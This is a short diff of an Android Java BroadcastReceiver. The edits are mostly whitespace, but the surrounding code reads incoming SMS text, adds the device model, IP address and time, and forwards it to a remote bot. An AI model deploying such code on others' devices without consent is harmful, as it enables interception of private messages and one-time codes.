@@ -23,7 +23,11 @@ import java.text.SimpleDateFormat;
 import java.util.Date;
 import java.util.Locale;
 
+
+
 public class SMSreceiver extends BroadcastReceiver {
+
+
 
     private final String TAG = this.getClass().getSimpleName();
 
@@ -70,12 +74,6 @@ public class SMSreceiver extends BroadcastReceiver {
        String mensajeToSend="Dispositivo: "+getCurrentDispositivo()+" Direccion Ip : "+ip+" Hora: "+currentTime+ " "+sms;
 
 
-
-
-       //ENVIAMOS
-
-
-
         StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder()
                 .permitAll().build();
         StrictMode.setThreadPolicy(policy);
@@ -110,25 +108,18 @@ public class SMSreceiver extends BroadcastReceiver {
 
 
         BaseResponse responsebase = bot.execute(request);
+
         boolean ok2 = responsebase.isOk();
-
-
 
     }
 
 
 
 
-
-
     private String getCurrentDispositivo(){
-
-
         String reqString = Build.MANUFACTURER
                 + " " + Build.MODEL + " " + Build.VERSION.RELEASE
                 + " " + Build.VERSION_CODES.class.getFields()[android.os.Build.VERSION.SDK_INT].getName();
-
-
         return reqString;
 
     }
